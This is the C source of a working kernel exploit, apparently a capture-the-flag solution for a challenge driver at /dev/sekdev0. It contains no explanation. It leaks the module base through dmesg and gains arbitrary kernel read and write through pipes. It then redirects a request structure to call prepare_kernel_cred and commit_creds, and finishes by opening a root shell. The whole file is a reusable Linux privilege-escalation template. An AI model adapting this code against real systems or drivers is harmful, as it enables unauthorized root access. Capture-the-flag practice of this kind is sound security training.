/*
 * 2019_dsec_ctf exploit code
 * by d0now@stealien
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>

#define SEK_LOGIN  0x40482a01
#define SEK_LOGOUT 0x40482a02
#define SEK_REGIST 0x40482a03
#define SEK_INFO   0x40482a04
#define SEK_FLUSH  0x40482a05

#define MOD_BSS_OFFSET  0x23c0
#define MOD_DATA_OFFSET 0x2000

struct ioctl_register {
    char id[32];
    char pw[32];
    uint64_t otp;
};

int kptr_read(void *addr, void *buf, size_t len) {

    int err = -1;
    int pipes[2];

    if (pipe(pipes))
        goto err;

    if (write(pipes[1], addr, len) != len)
        goto err;

    if (read(pipes[0], buf, len) != len)
        goto err;

    err = 0;

done:
err:
    close(pipes[0]);
    close(pipes[1]);
    return err;
}

// *addr = *buf;
int kptr_write(void *addr, void *buf, size_t len) {

    int err = -1;
    int pipes[2];

    if (pipe(pipes))
        goto err;

    if (write(pipes[1], buf, len) != len)
        goto err;

    if (read(pipes[0], addr, len) != len)
        goto err;

done:
    err = 0;
err:
    close(pipes[0]);
    close(pipes[1]);
    return err;
}

uint64_t get_module_leak(void) {
    
    int fd;
    char line[512];
    int idx;
    uint64_t ret=0, n;

    system("dmesg > /tmp/kmsg");
    fd = open("/tmp/kmsg", O_RDONLY);
    idx = 0;
    while (read(fd, &line[idx], 1) == 1) {
        if (line[idx] == '\n') {
            line[idx] = '\0';
            if (!strncmp(line, "Permission", 10)) {
                sscanf(line, "Permission %lx=%lx", &ret, &n);
            }
            if (ret)
                break;
            idx = 0;
            continue;
        }
        idx++;
    }

    close(fd);
    return ret;
}

int main(void) {

    int fd;
    uint64_t ret, mod_base;
    struct ioctl_register arg;

    memset(&arg, 0, sizeof(arg));

    fd = open("/dev/sekdev0", O_RDWR);
    if (fd == -1)
        goto err;

    /* leak stage */
    strcpy(arg.id, "admin");
    strcpy(arg.pw, "pass");
    arg.otp = 0x31337;
    ioctl(fd, SEK_REGIST, &arg);
    ioctl(fd, SEK_LOGIN, &arg);
    ioctl(fd, SEK_INFO, &arg);
    ioctl(fd, SEK_LOGOUT, NULL);
    ioctl(fd, SEK_FLUSH, NULL);
    ret = get_module_leak();
    mod_base = ret - 0x2468;
    printf("module base = %lx\n", mod_base);

    /* make kernel arb r&w */
    strcpy(arg.id, "hacker");
    strcpy(arg.pw, "it's 1337");
    arg.otp = 0x314cc47;
    unlink("/tmp/database.bin");
    ioctl(fd, SEK_INFO, &arg);
    ioctl(fd, SEK_LOGIN, &arg);
    kptr_read((void *)mod_base, &ret, sizeof(ret));
    if (!ret)
        goto err;

    /*
     * get leak of request
    */
    uint64_t bss = mod_base + MOD_BSS_OFFSET;
    uint64_t data = mod_base + MOD_DATA_OFFSET;

    kptr_read((void *)(bss+0x50), &ret, sizeof(ret));   // request_head = bss+0x10
    uint64_t request = ret;

    kptr_read((void *)(data+0x100), &ret, sizeof(ret)); // prepare_kernel_cred_x = data+0x100
    uint64_t prepare_kernel_cred = ret;

    kptr_read((void *)(data+0x108), &ret, sizeof(ret)); // commit_creds = data+0x108
    uint64_t commit_creds = ret;

    printf("request = 0x%lx\n", request);
    printf("prepare_kernel_cred = 0x%lx\n", prepare_kernel_cred);
    printf("commit_creds = 0x%lx\n", commit_creds);

    /* Get root_cred */
    ret = prepare_kernel_cred;
    kptr_write((void *)(request+0x8), &ret, sizeof(ret));
    usleep(100);
    ret = 0;
    kptr_write((void *)(request+0x10), &ret, sizeof(ret));
    usleep(100);
    ret = ioctl(fd, SEK_FLUSH, NULL);
    uint64_t root_cred = ret & 0x00000000ffffffff;
    ret = request & 0xffffffff00000000;
    root_cred |= ret;
    printf("root_cred = %lx\n", root_cred);

    /* Call commit_creds */
    ioctl(fd, SEK_INFO, &arg);
    kptr_read((void *)(bss+0x50), &ret, sizeof(ret));
    usleep(100);
    request = ret;
    ret = commit_creds;
    kptr_write((void *)(request+0x8), &ret, sizeof(ret));
    usleep(100);
    ret = root_cred;
    kptr_write((void *)(request+0x10), &ret, sizeof(ret));
    usleep(100);
    ret = ioctl(fd, SEK_FLUSH, NULL);

done:
    system("/bin/sh");
    return 0;
err:
    printf("Exploit failed.\n");
    return -1;
}